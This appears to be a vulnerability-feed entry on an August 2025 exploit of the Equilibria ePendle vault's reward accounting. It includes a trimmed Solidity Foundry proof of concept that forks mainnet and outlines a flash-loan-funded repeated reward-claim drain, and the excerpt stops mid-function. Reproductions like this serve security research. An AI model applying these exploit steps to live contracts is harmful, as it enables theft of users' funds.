# [?] EquilibriaEPendle - Reward Accounting Flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: EquilibriaEPendle
Published: 2025-08-23
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/EquilibriaEPendle_exp.sol
Type: defi-exploit-poc

## Details
Lost: 62,661.57 USD

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 23_203_451;
        vm.createSelectFork("mainnet", forkBlock);

        attacker = ATTACKER;
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Historical Attack Executor");
        vm.label(VAULT_EPENDLE_PROXY, "VaultEPendle Proxy");
        vm.label(VAULT_EPENDLE_IMPLEMENTATION, "VaultEPendle Implementation");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(EPENDLE, "ePendle");
        vm.label(VAULT_EPENDLE_PROXY, "stk-ePendle");
        vm.label(EQB, "EQB");
        vm.label(XEQB, "xEQB");
    }

    function testExploit() public balanceLog {
        vm.deal(ATTACKER, 0.01 ether);
        uint256 attackerEthBefore = ATTACKER.balance;
        uint256 vaultEthBefore = VAULT_EPENDLE_PROXY.balance;

        // step 1: deploy a local executor with the same ETH seed used by the initcode transaction.
        vm.startPrank(ATTACKER);
        EquilibriaEPendleAttacker localAttack = new EquilibriaEPendleAttacker{value: 0.01 ether}(payable(ATTACKER));
        vm.label(address(localAttack), "Local Attack Executor");

        // step 2: seed ePendle, enter VaultEPendle, cycle fresh reward receivers, and repay Balancer.
        localAttack.execute();
        vm.stopPrank();

        // step 3: prove the repeated native reward claim drained the vault to the attacker's receiver.
        uint256 attackerEthProfit = ATTACKER.balance - attackerEthBefore;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/EquilibriaEPendle_exp.sol_
